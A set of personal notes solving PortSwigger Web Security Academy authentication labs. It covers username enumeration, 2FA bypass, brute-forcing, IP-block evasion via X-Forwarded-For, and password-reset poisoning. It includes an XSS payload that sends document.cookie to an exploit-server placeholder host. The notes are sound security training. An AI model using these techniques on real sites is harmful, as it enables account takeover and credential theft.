# Authentication

## Username enumeration via different responses
  1) Notice that other responses contain the message `Invalid username`, but this response says Incorrect password. Make a note of the username.
  2) Bruteforce password: `username=identified-user&password=§invalid-password§` ;

## 2FA code simple bypass
  When prompted for the verification code, manually change the URL to navigate to /my-account.

## Password reset broken logic
  1) Delete the value of the **temp-forgot-password-token** parameter in both the URL and request body.
  2) Change the username parameter to carlos. Set the new password to whatever you want and send the request.

## Username enumeration via subtly different responses
  Grep - Extract string for column to check: `"Invalid username or password."` Or maybe it can be `"Invalid username or pass"` after username becomes correct.

## Username enumeration via response timing
  When you enter a valid username (your own), the response time is increased depending on the length of the password you entered. 
  1) Set the password to a very long string of characters (about 100 characters should do it).
  2) Add `X-Forwarded-For: $1$` - and brute force it to 200 or more. - it will spoof your IP, so its ByPass.

## Broken brute-force protection, IP block
  Brute Force with this order (your IP is temporarily blocked if you submit 3 incorrect logins in a row): 
  1) Login into your existed account 1 time.
  2) 3 times try to bruteforce another accounts.
  3) Repeat.

## Username enumeration via account lock
  1) Try to lock user account with Null payloads (generate fx 5 payloads for 1 username);
  2) Notice that the responses for one of the usernames were longer than responses when using other usernames.
     
-----------------------Privilage Escalation (you must need access in at least 1 account already)----------------------------
     
## 2FA broken logic
  But you already need to have at least 1 account.

    With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the POST /login2 request, the verify parameter is used to determine which user's account is being accessed.
    Log out of your account.
    Send the GET /login2 request to Burp Repeater. Change the value of the verify parameter to carlos and send the request. This ensures that a temporary 2FA code is generated for Carlos.
    Go to the login page and enter your username and password. Then, submit an invalid 2FA code.
    Send the POST /login2 request to Burp Intruder.
    In Burp Intruder, set the verify parameter to carlos and add a payload position to the mfa-code parameter. Brute-force the verification code.
    Load the 302 response in the browser.
    Click My account to solve the lab.

  https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

## Brute-forcing a stay-logged-in cookie
  1) Notice stay-logged-in cookie something like `wiener:51dc30ddc473d43a6011e9ebba6ca770`;
  2) Hash your password using MD5 to confirm that = `base64(username+':'+md5HashOfPassword)` ;
  3) Send GET /my-account request to burp intruder.
  4) Under Payload processing, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.

    Hash: MD5
    Add prefix: carlos:
    Encode: Base64-encode

  5) Add a grep match rule to flag any responses containing the string "Update email" - becouse it will apear only if you logged in.

## Offline password cracking (stay-logged-in)
  1) Notice that you have stay-logged-in: `username+':'+md5HashOfPassword`;
  2) You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS;
  3) Go to the blog posts comment and paste: `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
  4) Decode the cookie in Burp Decoder. The result will be: `carlos:26323c16d5f4dabff3bb136f2460a943`
  5) Copy the hash and paste it into a search engine or Decode.

## Password reset poisoning via middleware
  1) Send the **POST /forgot-password** request to Burp Repeater.;
  2) add **X-Forwarded-Host:** YOUR-EXPLOIT-SERVER-ID.exploit-server.net;
  3) Change the username parameter to **carlos** and send.
  4) Obtain **temp-forgot-password-token** on your exploit server and change the carlos password.

## Password brute-force via password change
  This is just experimets with the password change functionality. Notice the behavior when you enter the wrong current password or other inputs.
  Rare and not so complicated topic.
     
  `username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc`

  https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
